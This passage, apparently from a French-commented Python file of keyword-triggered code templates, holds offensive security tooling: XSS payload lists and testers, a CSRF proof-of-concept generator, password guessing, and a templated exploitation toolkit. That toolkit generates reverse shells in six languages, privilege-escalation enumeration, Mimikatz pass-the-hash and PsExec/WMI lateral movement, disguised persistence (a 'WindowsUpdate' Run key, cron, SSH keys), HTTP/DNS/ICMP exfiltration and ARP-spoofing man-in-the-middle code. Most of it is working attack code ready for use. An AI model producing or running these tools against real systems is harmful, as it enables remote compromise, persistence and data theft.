# XSS (CROSS-SITE SCRIPTING) TESTING
# ========================================

class XSSTester:
    '''Testeur de vulnérabilités XSS'''
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        self.payloads = self._load_xss_payloads()
        
    def _load_xss_payloads(self) -> List[str]:
        '''Charger les payloads XSS'''
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            "\\';alert('XSS')//",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<IMG SRC=\\"javascript:alert('XSS')\\">",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=`javascript:alert('XSS')`>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
            "\\" ><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
    
    def test_reflected_xss(self, params: Dict[str, str]) -> List[Dict[str, Any]]:
        '''Tester les XSS réfléchies'''
        vulnerabilities = []
        
        for param in params.keys():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(self.url, params=test_params, timeout=10)
                    
                    # Vérifier si le payload est reflété dans la réponse
                    if payload in response.text or self._is_xss_reflected(response.text, payload):
                        vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'parameter': param,
                            'payload': payload,
                            'url': response.url,
                            'severity': 'HIGH',
                            'evidence': f'Payload reflected in response'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def test_stored_xss(self, form_url: str, form_data: Dict[str, str]) -> List[Dict[str, Any]]:
        '''Tester les XSS stockées'''
        vulnerabilities = []
        marker = f"XSS_TEST_{int(time.time())}"
        
        for field in form_data.keys():
            for payload in self.payloads:
                # Insérer le payload avec un marqueur unique
                test_data = form_data.copy()
                test_data[field] = f"{marker}_{payload}"
                
                try:
                    # Soumettre le formulaire
                    self.session.post(form_url, data=test_data, timeout=10)
                    
                    # Vérifier si le payload est stocké et exécuté
                    response = self.session.get(self.url, timeout=10)
                    
                    if marker in response.text and payload in response.text:
                        vulnerabilities.append({
                            'type': 'Stored XSS',
                            'field': field,
                            'payload': payload,
                            'severity': 'CRITICAL',
                            'evidence': f'Payload stored and reflected: {marker}'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def test_dom_xss(self) -> List[Dict[str, Any]]:
        '''Tester les XSS basées sur le DOM'''
        vulnerabilities = []
        
        try:
            response = self.session.get(self.url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Rechercher les scripts qui utilisent des sources dangereuses
            dangerous_sinks = [
                'document.write',
                'document.writeln',
                'innerHTML',
                'outerHTML',
                'eval',
                'setTimeout',
                'setInterval',
                'location',
                'location.href'
            ]
            
            for script in soup.find_all('script'):
                script_content = script.string
                if script_content:
                    for sink in dangerous_sinks:
                        if sink in script_content and any(source in script_content for source in ['location', 'document.URL', 'document.referrer']):
                            vulnerabilities.append({
                                'type': 'Potential DOM-based XSS',
                                'sink': sink,
                                'severity': 'HIGH',
                                'evidence': script_content[:200]
                            })
                            
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def _is_xss_reflected(self, content: str, payload: str) -> bool:
        '''Vérifier si le payload XSS est reflété'''
        # Supprimer l'encodage HTML
        decoded = content.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"')
        return payload in decoded

# ========================================
# CSRF (CROSS-SITE REQUEST FORGERY) TESTING
# ========================================

class CSRFTester:
    '''Testeur de vulnérabilités CSRF'''
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def check_csrf_protection(self, form_url: str) -> Dict[str, Any]:
        '''Vérifier la protection CSRF sur un formulaire'''
        try:
            response = self.session.get(form_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            vulnerabilities = []
            
            for i, form in enumerate(forms):
                # Chercher un token CSRF
                csrf_token = None
                token_patterns = ['csrf', 'token', '_token', 'authenticity_token']
                
                for input_tag in form.find_all('input', {'type': 'hidden'}):
                    input_name = input_tag.get('name', '').lower()
                    if any(pattern in input_name for pattern in token_patterns):
                        csrf_token = input_tag.get('value')
                        break
                
                if not csrf_token:
                    # Vérifier l'en-tête
                    if 'X-CSRF-Token' not in response.headers:
                        vulnerabilities.append({
                            'type': 'CSRF Protection Missing',
                            'form_index': i,
                            'form_action': form.get('action'),
                            'form_method': form.get('method', 'GET'),
                            'severity': 'MEDIUM',
                            'evidence': 'No CSRF token found in form or headers'
                        })
            
            return {
                'url': form_url,
                'forms_analyzed': len(forms),
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def generate_csrf_poc(self, form_action: str, method: str, data: Dict[str, str]) -> str:
        '''Générer un PoC CSRF'''
        method = method.upper()
        
        if method == 'GET':
            params = '&'.join([f"{k}={v}" for k, v in data.items()])
            html = f'''
<html>
  <body>
    <h1>CSRF PoC</h1>
    <img src="{form_action}?{params}" />
  </body>
</html>
'''
            return html
        else:  # POST
            inputs = '\\n'.join([f'    <input type="hidden" name="{k}" value="{v}" />' for k, v in data.items()])
            html = f'''
<html>
  <body>
    <h1>CSRF PoC</h1>
    <form action="{form_action}" method="POST" id="csrfForm">
{inputs}
      <input type="submit" value="Submit" />
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
'''
            return html

# ========================================
# AUTHENTICATION & SESSION TESTING
# ========================================

class AuthenticationTester:
    '''Testeur d'authentification et de session'''
    
    def __init__(self, login_url: str):
        self.login_url = login_url
        self.session = requests.Session()
    
    def test_weak_passwords(self, username: str, password_list: List[str]) -> Dict[str, Any]:
        '''Tester des mots de passe faibles'''
        for password in password_list:
            try:
                response = self.session.post(
                    self.login_url,
                    data={'username': username, 'password': password},
                    timeout=10
                )
                
                # Vérifier le succès de connexion
                if self._is_login_successful(response):
                    return {
                        'success': True,
                        'username': username,
                        'password': password,
                        'severity': 'CRITICAL'
                    }
                    
            except Exception as e:
                continue
        
        return {'success': False}
    
    def test_brute_force_protection(self, username: str, attempts: int = 10) -> Dict[str, Any]:
        '''Tester la protection contre le brute force'''
        blocked = False
        
        for i in range(attempts):
            try:
                response = self.session.post(
                    self.login_url,
                    data={'username': username, 'password': f'wrong_password_{i}'},
                    timeout=10
                )
                
                # Vérifier si on est bloqué
                if response.status_code == 429 or 'too many' in response.text.lower():
                    blocked = True
                    break
                    
            except Exception as e:
                continue
        
        return {
            'protected': blocked,
            'attempts_before_block': i if blocked else attempts,
            'severity': 'HIGH' if not blocked else 'LOW'
        }
    
    def test_session_fixation(self) -> Dict[str, Any]:
        '''Tester la fixation de session'''
        # Obtenir une session avant connexion
        response1 = self.session.get(self.login_url, timeout=10)
        session_before = self.session.cookies.get('sessionid') or self.session.cookies.get('PHPSESSID')
        
        # Se connecter
        self.session.post(
            self.login_url,
            data={'username': 'test', 'password': 'test'},
            timeout=10
        )
        
        # Vérifier si la session a changé
        session_after = self.session.cookies.get('sessionid') or self.session.cookies.get('PHPSESSID')
        
        if session_before == session_after:
            return {
                'vulnerable': True,
                'type': 'Session Fixation',
                'severity': 'HIGH',
                'evidence': 'Session ID not regenerated after login'
            }
        
        return {'vulnerable': False}
    
    def test_session_timeout(self, timeout_minutes: int = 30) -> Dict[str, Any]:
        '''Tester le timeout de session'''
        # Se connecter
        self.session.post(
            self.login_url,
            data={'username': 'test', 'password': 'test'},
            timeout=10
        )
        
        # Attendre (simulation)
        time.sleep(2)  # En production, attendre le timeout réel
        
        # Essayer d'accéder à une page protégée
        response = self.session.get(self.login_url.replace('/login', '/dashboard'), timeout=10)
        
        # En production, vérifier si la session est toujours valide
        return {
            'timeout_configured': True,  # À déterminer selon la réponse
            'recommendation': f'Session should timeout after {timeout_minutes} minutes of inactivity'
        }
    
    def _is_login_successful(self, response: requests.Response) -> bool:
        '''Déterminer si la connexion est réussie'''
        success_indicators = [
            response.status_code == 302,  # Redirection
            'dashboard' in response.url.lower(),
            'welcome' in response.text.lower(),
            'logout' in response.text.lower()
        ]
        
        failure_indicators = [
            'invalid' in response.text.lower(),
            'incorrect' in response.text.lower(),
            'failed' in response.text.lower()
        ]
        
        return any(success_indicators) and not any(failure_indicators)

# ========================================
# SCRIPT D'EXÉCUTION COMPLET
# ========================================

def full_vulnerability_scan(target_url: str):
    '''Scanner complet de vulnérabilités web'''
    print(f"\\n{'='*60}")
    print(f"WEB VULNERABILITY SCAN FOR: {target_url}")
    print(f"{'='*60}\\n")
    
    report = {
        'url': target_url,
        'timestamp': time.time(),
        'vulnerabilities': []
    }
    
    # Test SQL Injection
    print("[*] Testing for SQL Injection...")
    sql_tester = SQLInjectionTester(target_url)
    sql_vulns = sql_tester.test_get_parameter('id')
    report['vulnerabilities'].extend(sql_vulns)
    print(f"[+] Found {len(sql_vulns)} SQL Injection vulnerabilities")
    
    # Test XSS
    print("[*] Testing for XSS...")
    xss_tester = XSSTester(target_url)
    xss_vulns = xss_tester.test_reflected_xss({'q': 'test'})
    report['vulnerabilities'].extend(xss_vulns)
    print(f"[+] Found {len(xss_vulns)} XSS vulnerabilities")
    
    # Test CSRF
    print("[*] Testing for CSRF...")
    csrf_tester = CSRFTester(target_url)
    csrf_results = csrf_tester.check_csrf_protection(target_url)
    if csrf_results.get('vulnerabilities'):
        report['vulnerabilities'].extend(csrf_results['vulnerabilities'])
    print(f"[+] CSRF test complete")
    
    # Sauvegarder le rapport
    filename = f"vuln_report_{urlparse(target_url).netloc}_{int(time.time())}.json"
    with open(filename, 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\\n[+] Report saved to: {filename}")
    print(f"[+] Total vulnerabilities found: {len(report['vulnerabilities'])}")
    
    return report

if __name__ == "__main__":
    # EXEMPLE D'UTILISATION
    target = "http://testphp.vulnweb.com/"
    report = full_vulnerability_scan(target)
"""
    },

    # ========================================
    # PENTESTING - EXPLOITATION & POST-EXPLOITATION
    # ========================================
    
    "pentest_exploitation": {
        "patterns": ["pentest exploitation", "payload", "reverse shell", "privilege escalation", "lateral movement"],
        "template": """
# ========================================
# PENTESTING - EXPLOITATION & POST-EXPLOITATION
# ========================================

import socket
import subprocess
import os
import sys
import base64
import hashlib
from typing import List, Dict, Any
import platform
import psutil
import winreg  # Windows only
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests

# ========================================
# REVERSE SHELLS
# ========================================

class ReverseShell:
    '''Générateur de reverse shells'''
    
    @staticmethod
    def bash_reverse_shell(lhost: str, lport: int) -> str:
        '''Reverse shell Bash'''
        return f\"\"\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"\"\"
    
    @staticmethod
    def netcat_reverse_shell(lhost: str, lport: int) -> str:
        '''Reverse shell Netcat'''
        return f\"\"\"nc -e /bin/sh {lhost} {lport}\"\"\"
    
    @staticmethod
    def python_reverse_shell(lhost: str, lport: int) -> str:
        '''Reverse shell Python'''
        return f\"\"\"
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
\"\"\"
    
    @staticmethod
    def php_reverse_shell(lhost: str, lport: int) -> str:
        '''Reverse shell PHP'''
        return f\"\"\"
<?php
$sock=fsockopen("{lhost}",{lport});
exec("/bin/sh -i <&3 >&3 2>&3");
?>
\"\"\"
    
    @staticmethod
    def powershell_reverse_shell(lhost: str, lport: int) -> str:
        '''Reverse shell PowerShell'''
        return f\"\"\"
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
\"\"\"
    
    @staticmethod
    def java_reverse_shell(lhost: str, lport: int) -> str:
        '''Reverse shell Java'''
        return f\"\"\"
Runtime r = Runtime.getRuntime();
Process p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"}});
p.waitFor();
\"\"\"
    
    @staticmethod
    def generate_all_shells(lhost: str, lport: int) -> Dict[str, str]:
        '''Générer tous les reverse shells'''
        return {
            'bash': ReverseShell.bash_reverse_shell(lhost, lport),
            'netcat': ReverseShell.netcat_reverse_shell(lhost, lport),
            'python': ReverseShell.python_reverse_shell(lhost, lport),
            'php': ReverseShell.php_reverse_shell(lhost, lport),
            'powershell': ReverseShell.powershell_reverse_shell(lhost, lport),
            'java': ReverseShell.java_reverse_shell(lhost, lport)
        }

# ========================================
# PRIVILEGE ESCALATION - LINUX
# ========================================

class LinuxPrivEsc:
    '''Énumération pour escalade de privilèges Linux'''
    
    @staticmethod
    def check_sudo_rights() -> List[str]:
        '''Vérifier les droits sudo'''
        try:
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=5)
            return result.stdout.split('\\n')
        except:
            return []
    
    @staticmethod
    def find_suid_binaries() -> List[str]:
        '''Trouver les binaires SUID'''
        try:
            result = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'],
                capture_output=True,
                text=True,
                timeout=60
            )
            return result.stdout.split('\\n')
        except:
            return []
    
    @staticmethod
    def check_writable_paths() -> List[str]:
        '''Vérifier les paths modifiables dans PATH'''
        paths = os.environ.get('PATH', '').split(':')
        writable = []
        
        for path in paths:
            if os.access(path, os.W_OK):
                writable.append(path)
        
        return writable
    
    @staticmethod
    def enumerate_cron_jobs() -> List[str]:
        '''Énumérer les tâches cron'''
        cron_locations = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/var/spool/cron/crontabs/',
            os.path.expanduser('~/crontab')
        ]
        
        cron_jobs = []
        for location in cron_locations:
            if os.path.exists(location):
                try:
                    if os.path.isfile(location):
                        with open(location, 'r') as f:
                            cron_jobs.append(f"{location}:\\n{f.read()}")
                    else:
                        for file in os.listdir(location):
                            filepath = os.path.join(location, file)
                            with open(filepath, 'r') as f:
                                cron_jobs.append(f"{filepath}:\\n{f.read()}")
                except:
                    pass
        
        return cron_jobs
    
    @staticmethod
    def check_kernel_version() -> Dict[str, str]:
        '''Vérifier la version du kernel pour exploits connus'''
        try:
            uname = subprocess.run(['uname', '-a'], capture_output=True, text=True)
            return {
                'kernel': uname.stdout.strip(),
                'exploits': LinuxPrivEsc._suggest_kernel_exploits(uname.stdout)
            }
        except:
            return {}
    
    @staticmethod
    def _suggest_kernel_exploits(kernel_version: str) -> List[str]:
        '''Suggérer des exploits kernel connus'''
        exploits = []
        
        # Base de données simplifiée d'exploits
        known_exploits = {
            '3.13': ['CVE-2015-1328 (OverlayFS)', 'CVE-2016-5195 (DirtyCOW)'],
            '4.4': ['CVE-2017-16995 (BPF)', 'CVE-2016-5195 (DirtyCOW)'],
            '4.8': ['CVE-2016-5195 (DirtyCOW)'],
        }
        
        for version, exploit_list in known_exploits.items():
            if version in kernel_version:
                exploits.extend(exploit_list)
        
        return exploits
    
    @staticmethod
    def check_docker_escape() -> Dict[str, Any]:
        '''Vérifier les possibilités d'échappement Docker'''
        checks = {
            'in_docker': os.path.exists('/.dockerenv'),
            'privileged': False,
            'docker_socket': os.path.exists('/var/run/docker.sock')
        }
        
        # Vérifier si on est dans un container privilégié
        try:
            with open('/proc/self/status', 'r') as f:
                for line in f:
                    if 'CapEff' in line:
                        # Si toutes les capabilities, c'est privilégié
                        cap_value = int(line.split()[1], 16)
                        checks['privileged'] = cap_value == 0x3fffffffff
        except:
            pass
        
        return checks
    
    @staticmethod
    def full_linux_enum() -> Dict[str, Any]:
        '''Énumération complète Linux'''
        return {
            'system_info': {
                'hostname': socket.gethostname(),
                'kernel': platform.release(),
                'os': platform.system(),
                'architecture': platform.machine()
            },
            'user_info': {
                'current_user': os.getenv('USER'),
                'uid': os.getuid() if hasattr(os, 'getuid') else 'N/A',
                'groups': subprocess.run(['groups'], capture_output=True, text=True).stdout.strip()
            },
            'sudo_rights': LinuxPrivEsc.check_sudo_rights(),
            'suid_binaries': LinuxPrivEsc.find_suid_binaries()[:20],
            'writable_paths': LinuxPrivEsc.check_writable_paths(),
            'cron_jobs': LinuxPrivEsc.enumerate_cron_jobs(),
            'kernel_exploits': LinuxPrivEsc.check_kernel_version(),
            'docker_escape': LinuxPrivEsc.check_docker_escape()
        }

# ========================================
# PRIVILEGE ESCALATION - WINDOWS
# ========================================

class WindowsPrivEsc:
    '''Énumération pour escalade de privilèges Windows'''
    
    @staticmethod
    def check_privileges() -> List[str]:
        '''Vérifier les privilèges actuels'''
        try:
            result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True)
            return result.stdout.split('\\n')
        except:
            return []
    
    @staticmethod
    def enumerate_services() -> List[Dict[str, str]]:
        '''Énumérer les services avec permissions faibles'''
        services = []
        
        try:
            # Lister tous les services
            result = subprocess.run(
                ['sc', 'query', 'state=', 'all'],
                capture_output=True,
                text=True
            )
            
            # Parser les services
            for line in result.stdout.split('\\n'):
                if 'SERVICE_NAME:' in line:
                    service_name = line.split(':')[1].strip()
                    
                    # Vérifier les permissions du service
                    perm_result = subprocess.run(
                        ['sc', 'sdshow', service_name],
                        capture_output=True,
                        text=True
                    )
                    
                    services.append({
                        'name': service_name,
                        'permissions': perm_result.stdout.strip()
                    })
        except:
            pass
        
        return services
    
    @staticmethod
    def check_unquoted_service_paths() -> List[str]:
        '''Chercher les chemins de service non quotés'''
        vulnerable_services = []
        
        try:
            result = subprocess.run(
                ['wmic', 'service', 'get', 'name,pathname'],
                capture_output=True,
                text=True
            )
            
            for line in result.stdout.split('\\n'):
                if 'C:\\\\' in line and '"' not in line and ' ' in line:
                    vulnerable_services.append(line.strip())
        except:
            pass
        
        return vulnerable_services
    
    @staticmethod
    def enumerate_scheduled_tasks() -> List[str]:
        '''Énumérer les tâches planifiées'''
        try:
            result = subprocess.run(['schtasks', '/query', '/fo', 'LIST', '/v'], capture_output=True, text=True)
            return result.stdout.split('\\n')[:100]  # Limiter la sortie
        except:
            return []
    
    @staticmethod
    def check_always_install_elevated() -> bool:
        '''Vérifier si AlwaysInstallElevated est activé'''
        try:
            # HKLM
            key1 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Policies\\Microsoft\\Windows\\Installer')
            value1, _ = winreg.QueryValueEx(key1, 'AlwaysInstallElevated')
            
            # HKCU
            key2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\\Policies\\Microsoft\\Windows\\Installer')
            value2, _ = winreg.QueryValueEx(key2, 'AlwaysInstallElevated')
            
            return value1 == 1 and value2 == 1
        except:
            return False
    
    @staticmethod
    def enumerate_installed_software() -> List[str]:
        '''Énumérer les logiciels installés'''
        software = []
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall')
            
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    
                    try:
                        name, _ = winreg.QueryValueEx(subkey, 'DisplayName')
                        version, _ = winreg.QueryValueEx(subkey, 'DisplayVersion')
                        software.append(f"{name} - {version}")
                    except:
                        pass
                except:
                    pass
        except:
            pass
        
        return software
    
    @staticmethod
    def check_weak_registry_permissions() -> List[str]:
        '''Vérifier les permissions faibles du registre'''
        vulnerable_keys = []
        
        # Clés critiques à vérifier
        critical_keys = [
            r'HKLM\\SYSTEM\\CurrentControlSet\\Services',
            r'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            r'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
        ]
        
        # Vérification nécessiterait AccessChk ou similaire
        return vulnerable_keys
    
    @staticmethod
    def full_windows_enum() -> Dict[str, Any]:
        '''Énumération complète Windows'''
        return {
            'system_info': {
                'hostname': socket.gethostname(),
                'os': platform.system(),
                'version': platform.version(),
                'architecture': platform.machine()
            },
            'user_info': {
                'current_user': os.getenv('USERNAME'),
                'domain': os.getenv('USERDOMAIN')
            },
            'privileges': WindowsPrivEsc.check_privileges(),
            'vulnerable_services': WindowsPrivEsc.check_unquoted_service_paths(),
            'scheduled_tasks': WindowsPrivEsc.enumerate_scheduled_tasks()[:10],
            'always_install_elevated': WindowsPrivEsc.check_always_install_elevated(),
            'installed_software': WindowsPrivEsc.enumerate_installed_software()[:20]
        }

# ========================================
# LATERAL MOVEMENT
# ========================================

class LateralMovement:
    '''Techniques de mouvement latéral'''
    
    @staticmethod
    def psexec_command(target: str, username: str, password: str, command: str) -> str:
        '''Générer une commande PsExec'''
        return f\"\"\"
psexec.exe \\\\\\\\{target} -u {username} -p {password} {command}
\"\"\"
    
    @staticmethod
    def wmi_command(target: str, username: str, password: str, command: str) -> str:
        '''Exécuter une commande via WMI'''
        return f\"\"\"
wmic /node:"{target}" /user:"{username}" /password:"{password}" process call create "{command}"
\"\"\"
    
    @staticmethod
    def rdp_command(target: str, username: str, password: str) -> str:
        '''Commande RDP'''
        return f\"\"\"
cmdkey /generic:{target} /user:{username} /pass:{password}
mstsc /v:{target}
\"\"\"
    
    @staticmethod
    def pass_the_hash(target: str, username: str, ntlm_hash: str) -> str:
        '''Pass-the-Hash avec Mimikatz'''
        return f\"\"\"
sekurlsa::pth /user:{username} /domain:. /ntlm:{ntlm_hash} /run:"mstsc.exe /v:{target}"
\"\"\"
    
    @staticmethod
    def enumerate_network_shares(target: str) -> List[str]:
        '''Énumérer les partages réseau'''
        try:
            result = subprocess.run(
                ['net', 'view', f'\\\\\\\\{target}'],
                capture_output=True,
                text=True
            )
            return result.stdout.split('\\n')
        except:
            return []

# ========================================
# PERSISTENCE
# ========================================

class Persistence:
    '''Techniques de persistance'''
    
    @staticmethod
    def registry_run_key(payload_path: str) -> str:
        '''Ajouter une clé Run au registre (Windows)'''
        return f\"\"\"
reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "WindowsUpdate" /t REG_SZ /d "{payload_path}" /f
\"\"\"
    
    @staticmethod
    def scheduled_task(task_name: str, payload_path: str) -> str:
        '''Créer une tâche planifiée'''
        return f\"\"\"
schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /ru System
\"\"\"
    
    @staticmethod
    def create_service(service_name: str, binary_path: str) -> str:
        '''Créer un service Windows'''
        return f\"\"\"
sc create {service_name} binpath= "{binary_path}" start= auto
sc start {service_name}
\"\"\"
    
    @staticmethod
    def linux_cron_persistence(payload_path: str) -> str:
        '''Ajouter une tâche cron (Linux)'''
        return f\"\"\"
(crontab -l 2>/dev/null; echo "@reboot {payload_path}") | crontab -
\"\"\"
    
    @staticmethod
    def bashrc_persistence(payload: str) -> str:
        '''Ajouter au .bashrc'''
        return f\"\"\"
echo '{payload}' >> ~/.bashrc
\"\"\"
    
    @staticmethod
    def ssh_key_persistence(public_key: str) -> str:
        '''Ajouter une clé SSH'''
        return f\"\"\"
mkdir -p ~/.ssh
echo '{public_key}' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
\"\"\"

# ========================================
# DATA EXFILTRATION
# ========================================

class DataExfiltration:
    '''Techniques d'exfiltration de données'''
    
    @staticmethod
    def exfiltrate_via_http(file_path: str, exfil_url: str) -> str:
        '''Exfiltrer via HTTP POST'''
        return f\"\"\"
import requests
with open('{file_path}', 'rb') as f:
    requests.post('{exfil_url}', files={{'file': f}})
\"\"\"
    
    @staticmethod
    def exfiltrate_via_dns(data: str, dns_server: str) -> str:
        '''Exfiltrer via DNS queries'''
        # Encoder les données en base64 et les envoyer via DNS
        encoded = base64.b64encode(data.encode()).decode()
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        
        commands = []
        for i, chunk in enumerate(chunks):
            commands.append(f"nslookup {chunk}.{i}.{dns_server}")
        
        return '\\n'.join(commands)
    
    @staticmethod
    def exfiltrate_via_icmp(file_path: str, target_ip: str) -> str:
        '''Exfiltrer via ICMP'''
        return f\"\"\"
import subprocess
with open('{file_path}', 'rb') as f:
    data = f.read()
    for i in range(0, len(data), 64):
        chunk = data[i:i+64].hex()
        subprocess.run(['ping', '-c', '1', '-p', chunk, '{target_ip}'])
\"\"\"
    
    @staticmethod
    def compress_and_encrypt(file_path: str, output_path: str, password: str):
        '''Compresser et chiffrer avant exfiltration'''
        # Utiliser AES pour le chiffrement
        key = hashlib.sha256(password.encode()).digest()
        cipher = AES.new(key, AES.MODE_EAX)
        
        with open(file_path, 'rb') as f:
            data = f.read()
        
        ciphertext, tag = cipher.encrypt_and_digest(data)
        
        with open(output_path, 'wb') as f:
            f.write(cipher.nonce)
            f.write(tag)
            f.write(ciphertext)
        
        return output_path

# ========================================
# SCRIPT D'EXÉCUTION
# ========================================

def generate_exploitation_toolkit(target: str, lhost: str, lport: int):
    '''Générer un toolkit d'exploitation complet'''
    toolkit = {
        'target': target,
        'listener': f"{lhost}:{lport}",
        'reverse_shells': ReverseShell.generate_all_shells(lhost, lport),
        'privilege_escalation': {
            'linux': 'Run LinuxPrivEsc.full_linux_enum()',
            'windows': 'Run WindowsPrivEsc.full_windows_enum()'
        },
        'persistence': {
            'registry': Persistence.registry_run_key('C:\\\\\\\\payload.exe'),
            'scheduled_task': Persistence.scheduled_task('Update', 'C:\\\\\\\\payload.exe'),
            'cron': Persistence.linux_cron_persistence('/tmp/payload.sh'),
            'ssh_key': 'Generate and use Persistence.ssh_key_persistence()'
        },
        'lateral_movement': {
            'psexec': LateralMovement.psexec_command(target, 'admin', 'password', 'cmd.exe'),
            'wmi': LateralMovement.wmi_command(target, 'admin', 'password', 'calc.exe')
        }
    }
    
    return toolkit

if __name__ == "__main__":
    # Générer le toolkit
    toolkit = generate_exploitation_toolkit('192.168.1.100', '10.10.10.10', 4444)
    
    # Sauvegarder
    import json
    with open('exploitation_toolkit.json', 'w') as f:
        json.dump(toolkit, f, indent=2)
    
    print("[+] Exploitation toolkit generated!")
"""
    },

    # ========================================
    # PENTESTING - NETWORK & WIRELESS
    # ========================================
    
    "pentest_network_wireless": {
        "patterns": ["pentest network", "wireless hacking", "wifi pentest", "mitm", "packet sniffing", "arp spoofing"],
        "template": """
# ========================================
# PENTESTING - NETWORK & WIRELESS ATTACKS
# ========================================

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether
import netifaces
import threading
import time
from typing import List, Dict, Any, Optional
import hashlib

# ========================================
# ARP SPOOFING / MITM
# ========================================

class ARPSpoofing:
    '''Attaques ARP Spoofing pour Man-in-the-Middle'''
    
    def __init__(self, interface: str):
        self.interface = interface
        self.original_mac = {}
        
    def get_mac(self, ip: str) -> Optional[str]:
        '''Obtenir l'adresse MAC d'une IP'''
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered:
                return answered[0][1].hwsrc
        except Exception as e:
            print(f"Error getting MAC: {e}")
        return None
    
    def spoof(self, target_ip: str, spoof_ip: str):
        '''Envoyer des paquets ARP falsifiés'''
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            print(f"[!] Could not find MAC for {target_ip}")
            return
        
        # Créer un paquet ARP falsifié
        arp_response = ARP(
            op=2,  # is-at (response)
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        
        send(arp_response, verbose=False)
    
    def restore(self, destination_ip: str, source_ip: str):
        '''Restaurer les tables ARP'''
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        
        arp_response = ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )
        
        send(arp_response, count=5, verbose=False)
    
    def mitm_attack(self, target_ip: str, gateway_ip: str, duration: int = 60):
        '''Effectuer une attaque MITM'''
        print(f"[*] Starting MITM attack: {target_ip} <-> {gateway_ip}")
        print(f"[*] Duration: {duration} seconds")
        
        # Activer le forwarding IP
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        
        try:
            start_time = time.time()
            while time.time() - start_time < duration:
                self.spoof(target_ip, gateway_ip)
                self.spoof(gateway_ip, target_ip)
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\\n[*] Stopping MITM attack...")
        finally:
            # Restaurer les tables ARP
            print("[*] Restoring ARP tables...")
            self.restore(target_ip, gateway_ip)
            self.restore(gateway_ip, target_ip)
            
            # Désactiver le forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
            
            print("[+] MITM attack completed")

# ========================================
# DNS SPOOFING
# ========================================

class DNSSpoofing:
    '''Attaque DNS Spoofing'''
    
